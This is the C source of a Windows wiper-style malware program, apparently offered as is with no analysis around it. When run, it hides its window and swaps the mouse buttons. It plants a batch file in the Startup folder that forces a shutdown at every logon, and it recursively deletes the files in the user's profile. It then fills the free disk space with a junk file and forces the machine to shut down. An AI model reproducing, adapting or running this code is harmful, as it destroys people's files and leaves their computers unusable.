#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <dirent.h>
#include <sys/stat.h>
#include <string.h>
#include <io.h>
#define ULONG unsigned long long
#define PU PULARGE_INTEGER
#define SETCPOS \
    SetCursorPos(INT_MAX,INT_MAX)
    //0x7fffffff

const int S=256;
void flame(char *basepath);
ULONG freespace();
int recognize_dir(char *file);
_Bool checkperms(char *path);

int main(){
    char napoli[S],*sussyuwu=getenv("APPDATA"),*sus=getenv("USERPROFILE");
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    SwapMouseButton(TRUE);  //rundll32.exe user32.dll,SwapMouseButton
    if(sussyuwu!=NULL&&!chdir(sussyuwu)&&checkperms(sussyuwu)){
        chdir(sussyuwu);
        char fpath[S];
        strcpy(fpath,sussyuwu);
        strcat(fpath,"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\teardrops.bat");
        FILE *catanzaro = fopen(fpath,"wb");
        fprintf(catanzaro,"@echo off\nshutdown /s /f /t 0");
        fclose(catanzaro);
    }
    flame(sus);
    chdir(sussyuwu);
    ULONG a=(!freespace()?S:freespace());
    sprintf(napoli,"fsutil file createnew lol %llu",a);
    system(napoli);
    MessageBox(NULL,"\nWe love you.\n\n:3\n\n",__FILE__,1);
    return ExitWindowsEx(EWX_SHUTDOWN|EWX_FORCE,0);
}
 
void flame(char *basepath){
    DIR *ls;
    char *file, *deldir;
    struct dirent *dir;
    chdir(basepath);
    ls=opendir(".");
    if(ls){
        while((dir=readdir(ls))!=NULL){
            file=dir->d_name;   
            if(strcmp(file,".")+strcmp(file,"..")+strcmp(file,"AppData")==3&&!recognize_dir(file)){
                SETCPOS;
                char dirpath[S];
                sprintf(dirpath,"%s\\%s",_getcwd(NULL,0),file);
                if(checkperms(dirpath)) flame(dirpath); //i love recursionz
                chdir("..");
            } else remove(file);
        }  
        closedir(ls);
    }
    SETCPOS;
}

ULONG freespace(){
    ULONG ab=0;
    if(GetDiskFreeSpaceExA("C:\\",(PU)&ab,(PU)0,(PU)0)) return ab;
    else return 0;
}

int recognize_dir(char *file){
    struct stat isdir;
    stat(file, &isdir);
    return S_ISREG(isdir.st_mode);
}

_Bool checkperms(char *path){
    if (!_access(path, 2)) return 1; //FILE_ATTRIBUTE_DIRECTORY
    return 0;   
}
